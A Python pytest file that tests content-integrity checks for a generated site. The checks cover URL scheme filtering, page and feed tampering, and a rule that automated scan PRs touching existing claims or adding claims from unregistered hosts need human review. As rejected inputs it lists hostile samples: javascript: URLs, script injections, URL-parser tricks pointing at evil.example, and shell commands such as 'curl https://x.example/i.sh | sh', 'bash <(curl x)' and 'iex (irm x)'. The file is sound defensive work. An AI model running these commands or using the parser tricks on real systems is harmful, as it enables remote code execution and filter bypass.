"""content_checks.py: URL schemes, render equality, claim history (audit F2, F3, F5)."""

from __future__ import annotations

import copy

import content_checks as cc
import generate_html as gh
import pytest

# ---------------------------------------------------------------- URLs


@pytest.mark.parametrize(
    "url",
    ["https://a.example/x?y=1&z=2", "http://a.example/", "HTTPS://A.EXAMPLE/", None, ""],
)
def test_http_urls_pass(url):
    assert cc.url_problems({"url": url, "source_url": url}) == []


@pytest.mark.parametrize(
    "url",
    [
        "javascript:alert(1)",
        " https://a.example/",
        "data:text/html,x",
        "vbscript:x",
        "//evil.example/",
        "findings/a.md",
        'https://a.example/"onmouseover=x',
        "https://a.example/<script>",
        "https://a.example/ x",
        "https://a.example/`x",
        "https://",
        3,
        ["https://a.example/"],
    ],
)
def test_non_http_urls_fail(url):
    assert cc.url_problems({"article_url": url}) != []


def test_url_fields_are_found_at_any_depth():
    doc = {"entries": [{"lessons": [{"evidence": {"tweet_url": "javascript:x"}}]}]}
    assert cc.url_problems(doc) == ["entries[0].lessons[0].evidence.tweet_url: not an http(s) URL"]


def test_non_url_keys_are_not_checked():
    assert cc.url_problems({"title": "javascript:x", "urlish": "javascript:x"}) == []


# ---------------------------------------------------------------- render equality

PAYLOAD = {"claims": [], "findings": [{"title": "A </script> b", "url": "https://a.example/"}]}


def page(stamp="2026-10-20", payload=PAYLOAD):
    return gh.render(payload, stamp)


def test_main_renderer_output_passes():
    assert cc.render_problems(page(), gh.render) == []


def test_a_real_rendered_site_passes():
    assert cc.render_problems((gh.c.ROOT / "docs" / "index.html").read_text(), gh.render) == []


@pytest.mark.parametrize(
    "tamper",
    [
        lambda p: p.replace("</body>", "<script>alert(1)</script></body>"),
        lambda p: p.replace("function esc(s)", "function esc(s) { return s; } function x(s)"),
        lambda p: p + "<!-- -->",
        lambda p: p.replace('<script id="site-data"', '<script id="site-data" onload="x"'),
    ],
)
def test_hand_edited_pages_fail(tamper):
    assert cc.render_problems(tamper(page()), gh.render) != []


def test_two_data_blocks_fail():
    p = page()
    block = p[p.index('<script id="site-data"') : p.index("</script>", p.index("site-data")) + 9]
    assert cc.render_problems(p.replace(block, block + block), gh.render) != []


def test_unparseable_payload_fails():
    p = page().replace(
        '<script id="site-data" type="application/json">{',
        '<script id="site-data" type="application/json">{{',
    )
    assert cc.render_problems(p, gh.render) != []


def test_missing_stamp_fails():
    assert cc.render_problems(page().replace("<span>Generated <b>", "<span><b>"), gh.render) != []


# ---------------------------------------------------------------- claim history
# Policy: a scan PR may add claims and append evidence (bumping last_reviewed);
# any other change to an existing claim, live or retired, needs a human.

RETIRED = ("superseded", "refuted")


def claim(cid, status="current", **over):
    c = {
        "id": cid,
        "status": status,
        "statement": f"claim {cid}",
        "title": f"Title {cid}",
        "guidance": "do the thing",
        "confidence": 0.8,
        "evidence": [{"url": "https://e/1"}],
    }
    if status in RETIRED:
        c.update(superseded_by=["new"], superseded_on="2026-10-01", supersession_reason="r")
    c.update(over)
    return c


def ledger(*claims):
    return {"schema_version": 1, "claims": list(claims)}


MAIN = ledger(
    claim("live"),
    claim("old", "superseded"),
    claim("wrong", "refuted"),
    claim("new", supersedes=["old"]),
)
LIVE, OLD, WRONG, NEW = 0, 1, 2, 3


def test_unchanged_ledger_passes():
    assert cc.claim_history_problems(MAIN, copy.deepcopy(MAIN)) == []


def test_scans_may_add_claims_and_append_evidence():
    pr = copy.deepcopy(MAIN)
    pr["claims"].append(claim("brand-new"))
    for i in (LIVE, OLD, WRONG):
        pr["claims"][i]["evidence"].append({"url": "https://e/2", "stance": "supports"})
        pr["claims"][i]["last_reviewed"] = "2026-10-20"
    assert cc.claim_history_problems(MAIN, pr) == []


def test_refusal_reason_is_the_agreed_wording():
    pr = copy.deepcopy(MAIN)
    pr["claims"][0]["status"] = "contested"
    problems = cc.claim_history_problems(MAIN, pr)
    assert problems == ["claim change needs human review: live `status` changed"]


def test_deleted_claim_fails():
    pr = ledger(*[c for c in copy.deepcopy(MAIN)["claims"] if c["id"] != "old"])
    assert cc.claim_history_problems(MAIN, pr) == ["claim old on main is missing from the PR"]


FROZEN = [
    ("status", "contested"),
    ("statement", "reworded"),
    ("title", "Retitled"),
    ("guidance", "do something else"),
    ("superseded_by", ["other"]),
    ("superseded_on", "2026-10-19"),
    ("supersession_reason", "a different reason"),
    ("supersedes", ["another"]),
    ("confidence", 0.1),
    ("scope", "new scope"),
    # ledger dates and retired controls: only a reviewed correction moves them
    ("added_on", "2026-10-21"),
    ("changed_on", "2026-10-21"),
    ("refuted_controls", ["--ignore-scripts"]),
]


@pytest.mark.parametrize("index", [LIVE, OLD, WRONG, NEW])
@pytest.mark.parametrize("field, value", FROZEN)
def test_any_other_change_needs_human_review(index, field, value):
    pr = copy.deepcopy(MAIN)
    pr["claims"][index][field] = value
    problems = cc.claim_history_problems(MAIN, pr)
    assert problems and all(p.startswith(cc.NEEDS_REVIEW) for p in problems)
    assert f"`{field}`" in problems[0]


def test_retiring_a_live_claim_needs_human_review():
    """Superseding an existing claim edits both ends: never unattended."""
    pr = copy.deepcopy(MAIN)
    pr["claims"][LIVE].update(status="superseded", superseded_by=["x"], supersession_reason="r")
    pr["claims"].append(claim("x", supersedes=["live"]))
    problems = cc.claim_history_problems(MAIN, pr)
    assert {p.split("`")[1] for p in problems} == {
        "status",
        "superseded_by",
        "supersession_reason",
    }


@pytest.mark.parametrize("field", ["supersession_reason", "guidance", "title"])
def test_removing_a_field_needs_human_review(field):
    pr = copy.deepcopy(MAIN)
    del pr["claims"][WRONG][field]
    assert cc.claim_history_problems(MAIN, pr) != []


def test_adding_a_new_field_to_an_existing_claim_needs_human_review():
    pr = copy.deepcopy(MAIN)
    pr["claims"][LIVE]["basis"] = "added later"
    assert cc.claim_history_problems(MAIN, pr) != []


@pytest.mark.parametrize(
    "evidence",
    [[{"url": "https://e/other"}], [], "nope", [{"url": "https://e/2"}, {"url": "https://e/1"}]],
)
def test_rewritten_evidence_needs_human_review(evidence):
    pr = copy.deepcopy(MAIN)
    pr["claims"][LIVE]["evidence"] = evidence
    problems = cc.claim_history_problems(MAIN, pr)
    assert any("evidence" in p and p.startswith(cc.NEEDS_REVIEW) for p in problems)


def test_garbage_ledgers_report_missing_claims():
    assert cc.claim_history_problems(MAIN, {"claims": "nope"}) != []
    assert cc.claim_history_problems(MAIN, None) != []


# ---------------------------------------------------------------- sticky promotions
PROMO = {"promoted": True, "reason": "trending", "signals": [], "at": "2026-10-20"}


def _pool(*entries) -> dict:
    return {"entries": list(entries)}


def _ed(eid: str, **over) -> dict:
    return {"id": eid, "editorial": dict(PROMO), "grounding_score": 1.0, **over}


def test_kept_and_new_promotions_pass():
    main = [_pool(_ed("a")), []]
    pr = [_pool(_ed("a"), _ed("b")), []]
    assert cc.editorial_problems(main, pr) == []
    assert cc.editorial_problems([_pool({"id": "c"})], [_pool(_ed("c"))]) == []  # added


def test_a_promotion_may_move_to_the_archive():
    assert cc.editorial_problems([_pool(_ed("a")), []], [_pool(), [_ed("a")]]) == []


@pytest.mark.parametrize(
    "after,needle",
    [
        ({"id": "a", "grounding_score": 1.0}, "lost its promotion with main's integrity intact"),
        ({"id": "a", "editorial": {"promoted": False}}, "integrity intact"),
        ({"id": "a", "editorial": "yes"}, "integrity intact"),
        ({"id": "a", "verified": True, "grounding_score": None}, "integrity intact"),
        (None, "promoted entry a is gone"),
    ],
)
def test_a_demotion_with_integrity_intact_needs_review(after, needle):
    pr = [_pool(*([after] if after else []))]
    problems = cc.editorial_problems([_pool(_ed("a"))], pr)
    assert len(problems) == 1 and needle in problems[0]
    assert problems[0].startswith(cc.DEMOTION_REVIEW)


@pytest.mark.parametrize("lost", [{"verified": False}, {"grounding_score": 0.5}])
def test_integrity_flipped_inside_the_pr_is_not_evidence(lost):
    """verified / grounding_score are session-writable: flipping them on a
    promoted entry must not launder a demotion past the gate."""
    after = {"id": "a", "grounding_score": 1.0, **lost}
    problems = cc.editorial_problems([_pool(_ed("a"))], [_pool(after)])
    assert len(problems) == 1 and problems[0].startswith(cc.DEMOTION_REVIEW)


@pytest.mark.parametrize("lost", [{"verified": False}, {"grounding_score": 0.5}])
def test_integrity_already_lost_on_main_may_remove_a_promotion(lost):
    after = {"id": "a", "grounding_score": 1.0, **lost}
    assert cc.editorial_problems([_pool(_ed("a", **lost))], [_pool(after)]) == []


@pytest.mark.parametrize("order", ["demoted-last", "demoted-first"])
def test_an_id_is_kept_only_if_every_copy_stays_promoted(order):
    """A promoted copy elsewhere (pool vs archive) can't mask a demoted one."""
    kept, dropped = _ed("a"), {"id": "a", "grounding_score": 1.0}
    pr = [_pool(kept), [dropped]] if order == "demoted-last" else [_pool(dropped), [kept]]
    problems = cc.editorial_problems([_pool(_ed("a"))], pr)
    assert len(problems) == 1 and problems[0].startswith(cc.DEMOTION_REVIEW)
    assert cc.editorial_problems([_pool(_ed("a"))], [_pool(kept), [dict(kept)]]) == []


def test_garbage_docs_do_not_crash():
    assert cc.editorial_problems([None, "x", {"entries": "x"}], [None]) == []
    assert cc.editorial_problems([_pool(_ed("a"))], [None]) != []


def test_a_new_claim_may_arrive_with_its_ledger_dates():
    pr = copy.deepcopy(MAIN)
    pr["claims"].append(claim("dated", added_on="2026-10-21", changed_on="2026-10-21"))
    assert cc.claim_history_problems(MAIN, pr) == []


def test_add_claim_evidence_leaves_ledger_dates_alone(sandbox):
    """The one claim write a scan makes (add_claim.py evidence) must stay a
    content-only change on a ledger that carries added_on/changed_on."""
    import add_claim

    import claims as cl

    base = claim("dated", topic="ai-research", added_on="2026-07-01", changed_on="2026-07-01")
    base["evidence"] = [{"url": "https://e/1", "stance": "supports", "published": "2026-06-01"}]
    main = ledger(base)
    cl.save_ledger(copy.deepcopy(main))
    assert add_claim.main(["evidence", "dated", "--evidence", "supports|https://e/2"]) == 0
    assert cc.claim_history_problems(main, cl.load_ledger()) == []


# ---------------------------------------------------------------- feed equality


def feed_for(p):
    return gh.render_feed_for_page(p)


def test_exact_feed_render_is_accepted():
    p = page()
    assert cc.feed_problems(feed_for(p), p, gh.render_feed, True) == []


@pytest.mark.parametrize(
    "tamper",
    [
        lambda f: f.replace("</feed>", "<entry/></feed>"),
        lambda f: f.replace("<title>", "<title>x"),
        lambda f: f + "\n",
        lambda f: '<?xml-stylesheet href="feed.xsl"?>\n' + f,
        lambda f: "",
    ],
)
def test_hand_edited_feed_is_refused(tamper):
    p = page()
    assert cc.feed_problems(tamper(feed_for(p)), p, gh.render_feed, True) != []


def test_feed_must_match_the_payload_the_page_carries():
    other = page(payload={**PAYLOAD, "biggest_stories": ["x"], "findings": [{"id": "x"}]})
    assert cc.feed_problems(feed_for(page()), other, gh.render_feed, True) != []


def test_deleted_feed_is_refused_only_while_main_has_one():
    assert cc.feed_problems(None, page(), gh.render_feed, True) == ["docs/feed.xml is missing"]
    assert cc.feed_problems(None, page(), gh.render_feed, False) == []


def test_feed_with_an_unusable_page_is_refused():
    assert cc.feed_problems("<feed/>", "<html></html>", gh.render_feed, True) != []


# ------------------------------------------------------------- new claims
# A scan may add a claim only when every evidence URL is on the host of a registered
# blog, org or newsletter feed, and its text carries no URL or shell command. Nothing
# the session writes (source_id, verified, pool rows) is consulted.

REGISTRY = [
    {"id": "rss:a", "type": "rss", "active": True, "url": "https://blog.example/feed/"},
    {"id": "rss:www", "type": "rss", "active": True, "url": "https://www.lab.example/rss"},
    {"id": "off", "type": "rss", "active": False, "url": "https://dead.example/feed"},
    {"id": "gh", "type": "github_query", "active": True, "url": None},
    {"id": "x", "type": "x_account", "active": True, "url": "https://x.com/someone"},
    {"id": "yt", "type": "youtube", "active": True, "url": "https://youtube.com/channel/1"},
    {"id": "med", "type": "rss", "active": True, "url": "https://medium.com/feed/@a"},
    {"id": "arx", "type": "conference", "active": True, "url": "https://arxiv.org/list/cs.CR"},
    {"id": "conf", "type": "conference", "active": True, "url": "https://www.usenix.org/c/1"},
    "junk",
]
HOSTS = cc.registered_hosts(REGISTRY)


def added(*claims):
    return ledger(*copy.deepcopy(MAIN)["claims"], *claims)


def new_problems(pr, hosts=HOSTS):
    return cc.new_claim_problems(MAIN, pr, hosts)


def test_only_active_trusted_blog_hosts_anchor():
    assert HOSTS == {"blog.example", "lab.example", "usenix.org"}


@pytest.mark.parametrize(
    "url",
    ["https://blog.example/post", "http://BLOG.example/p?q=1", "https://www.lab.example/a/b"],
)
def test_new_claim_on_a_registered_host_passes(url):
    assert new_problems(added(claim("fresh", evidence=[{"url": url}]))) == []


def test_no_new_claim_needs_no_check():
    assert new_problems(copy.deepcopy(MAIN)) == []


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/p",
        "https://blog.example.evil.example/p",  # a registered name as a subdomain
        "https://evil.example/blog.example/p",
        "https://sub.blog.example/p",
        "https://dead.example/p",  # inactive feed
        "https://github.com/o/r",  # open-publishing host, even if a github_query exists
        "https://x.com/someone/status/1",
        "https://youtube.com/watch?v=ATTACKER",
        "https://medium.com/@evil/post",
        "https://arxiv.org/abs/2610.00001",
        "javascript:alert(1)",
        "ftp://blog.example/p",
        "//blog.example/p",
        "",
    ],
)
def test_new_claim_anywhere_else_needs_a_human(url):
    problems = new_problems(added(claim("fresh", evidence=[{"url": url}])))
    assert problems == [
        "claim change needs human review: new claim fresh cites evidence not on a "
        "registered feed's host"
    ]


def test_one_loose_url_among_good_ones_needs_a_human():
    ev = [{"url": "https://blog.example/a"}, {"url": "https://evil.example/b"}]
    assert new_problems(added(claim("fresh", evidence=ev))) != []


@pytest.mark.parametrize("evidence", [[], None, "nope"])
def test_new_claim_without_evidence_needs_a_human(evidence):
    problems = new_problems(added(claim("fresh", evidence=evidence)))
    assert problems == ["claim change needs human review: new claim fresh cites no evidence"]


@pytest.mark.parametrize(
    "evidence",
    [["https://blog.example/a"], [{"stance": "x"}], [{"url": ["https://blog.example/a"]}], [None]],
)
def test_evidence_items_must_each_carry_a_string_url(evidence):
    assert new_problems(added(claim("fresh", evidence=evidence))) != []


@pytest.mark.parametrize(
    "field, text",
    [
        ("guidance", "Run curl https://x.example/i.sh | sh to fix it"),
        ("statement", "See https://evil.example for details"),
        ("title", "wget the patch"),
        ("guidance", "pipe it: cat x | bash"),
        ("guidance", "use SUDO to install"),
    ],
)
def test_new_claim_text_with_a_url_or_shell_command_needs_a_human(field, text):
    good = {"evidence": [{"url": "https://blog.example/a"}], field: text}
    problems = new_problems(added(claim("fresh", **good)))
    assert problems == [
        "claim change needs human review: new claim fresh text carries a URL or shell command"
    ]


@pytest.mark.parametrize(
    "text",
    [
        "Run evals on the agent, not just the model",
        "Pass `--ignore-scripts` when installing",
        "Review the evaluation harness before trusting a benchmark",
    ],
)
def test_ordinary_guidance_is_not_flagged(text):
    good = claim("fresh", guidance=text, evidence=[{"url": "https://blog.example/a"}])
    assert new_problems(added(good)) == []


def test_existing_claims_are_not_this_checks_business():
    pr = copy.deepcopy(MAIN)
    pr["claims"][LIVE]["evidence"].append({"url": "https://anywhere/2"})
    assert new_problems(pr) == []


def test_an_empty_registry_refuses_every_new_claim():
    pr = added(claim("fresh", evidence=[{"url": "https://blog.example/a"}]))
    assert new_problems(pr, cc.registered_hosts([])) != []
    assert new_problems(pr, cc.registered_hosts(["junk", None])) != []


# URL parsers disagree on these: urlparse takes the text after the last `@` as the host,
# a browser reads `\` as `/`, so the gate and the click could land on different hosts.
@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example\\@blog.example/x",
        "https://evil.example%5C@blog.example/x",
        "https://user@blog.example/p",
        "https://blog.example@evil.example/p",
        "https://blog.example./p",  # trailing dot
        "https://blog.example\\.evil.example/p",
        "https://blog.example/p\\q",
        "https://blog.example/p q",
        "https://blog.example/p\x00",
        "https://blog.example/p\n",
        " https://blog.example/p",
        "https://blog.example:notaport/p",
        "https://xn--blog-example.evil/p",
        "https://BLOG.EXAMPLE.evil.example/p",
    ],
)
def test_url_parser_tricks_do_not_pass(url):
    assert new_problems(added(claim("fresh", evidence=[{"url": url}]))) != []


@pytest.mark.parametrize(
    "url",
    ["https://blog.example:8443/p", "https://Blog.Example/P?a=1#frag", "http://blog.example"],
)
def test_ordinary_registered_urls_still_pass(url):
    assert new_problems(added(claim("fresh", evidence=[{"url": url}]))) == []


@pytest.mark.parametrize(
    "host", ["feeds.feedburner.com", "sourcegraph.com", "socket.dev", "semgrep.dev",
             "ampcode.com", "media.defcon.org", "snyk.io"],
)  # fmt: skip
def test_vendor_hosts_that_carry_user_content_never_anchor(host):
    rows = [{"id": "r", "type": "rss", "active": True, "url": f"https://{host}/feed"}]
    assert cc.registered_hosts(rows) == set()


@pytest.mark.parametrize(
    "where",
    [
        {"scope": "see evil.io/x"},
        {"basis": "run curl x"},
        {"evidence": [{"url": "https://blog.example/a", "title": "https://evil.example"}]},
        {"evidence": [{"url": "https://blog.example/a", "note": "wget it"}]},
        {"evidence": [{"url": "https://blog.example/a", "source_name": "npm install evil"}]},
        {"tags": ["pip install evil"]},
        {"refuted_controls": ["sudo rm"]},
    ],
)
def test_every_rendered_text_field_is_linted(where):
    good = {"evidence": [{"url": "https://blog.example/a"}], **where}
    problems = new_problems(added(claim("fresh", **good)))
    assert "text carries a URL or shell command" in " ".join(problems)


@pytest.mark.parametrize(
    "text",
    [
        "npx evil-package", "npm i evil", "pnpm add evil", "pip3 install evil", "uvx evil",
        "python -c 'x'", "bash -c x", "powershell -enc x", "iex (irm x)", "x | /bin/sh",
        "bash <(curl x)", "visit www.evil", "go to evil.io", "evil.dev/x",
    ],
)  # fmt: skip
def test_install_commands_interpreters_and_bare_domains_are_flagged(text):
    good = claim("fresh", guidance=text, evidence=[{"url": "https://blog.example/a"}])
    assert "text carries a URL or shell command" in " ".join(new_problems(added(good)))
